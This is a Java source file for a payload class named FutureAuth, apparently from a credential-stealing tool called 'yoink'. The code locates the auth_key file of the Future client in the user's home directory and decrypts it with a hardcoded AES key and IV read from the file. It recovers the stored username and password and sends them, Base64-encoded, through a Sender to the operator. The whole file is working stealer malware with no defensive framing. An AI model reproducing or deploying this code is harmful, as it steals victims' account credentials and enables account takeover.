package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.FileUtil;
import me.perry.yoink.util.Message;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Arrays;
import java.util.Base64;
import java.util.Optional;

public final
class FutureAuth implements Payload {
    public static
    byte[] futureDecryptFile (byte[] array ,byte[] array2 ,byte[] array3) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(array2 ,"AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
        instance.init(2 ,secretKeySpec ,ivParameterSpec);
        return instance.doFinal(array);
    }

    @Override
    public
    void execute () {
        String[] auth = getFutureAuth();
        if (auth.length == 2) {
            Sender.send(new Message.Builder("Login")
                    .addField("Username (Base64)" ,Base64.getEncoder().encodeToString(auth[0].getBytes(StandardCharsets.UTF_8)) ,true)
                    .addField("Password (Base64)" ,Base64.getEncoder().encodeToString(auth[1].getBytes(StandardCharsets.UTF_8)) ,true)
                    .build());
        } else Sender.send("Failed to get future auth " + Arrays.toString(auth));
    }

    private
    byte[] futureReadFile (DataInputStream dataInputStream) throws IOException {
        byte[] arrby = new byte[dataInputStream.readInt()];
        dataInputStream.read(arrby);
        return arrby;
    }

    private
    byte[] futureKeyConvert () {
        byte[] array = new byte["428A487E3361EF9C5FC20233485EA236".length() / 2];
        int i = 0;

        for (int n = 0; i < "428A487E3361EF9C5FC20233485EA236".length(); i = n) {
            int n2 = n / 2;
            byte b = (byte) ((Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n) ,16) << 4) + Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n + 1) ,16));
            n += 2;
            array[n2] = b;
        }

        return array;
    }

    private
    String[] getFutureAuth () {
        Optional <File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\" + "auth_key");
        if (file.isPresent()) {
            try {
                byte[] key = futureKeyConvert();
                DataInputStream dis = new DataInputStream(Files.newInputStream(file.get().toPath()));
                byte[] arr1 = futureReadFile(dis);
                byte[] username = futureDecryptFile(futureReadFile(dis) ,key ,arr1);
                byte[] password = futureDecryptFile(futureReadFile(dis) ,key ,arr1);
                String user = new String(username ,StandardCharsets.UTF_8);
                String pass = new String(password ,StandardCharsets.UTF_8);
                return new String[]{user ,pass};
            } catch (Exception var8) {
                return new String[]{var8.getMessage() ,var8.getMessage()};
            }
        } else {
            return new String[]{"File not found" ,"File not found"};
        }
    }
}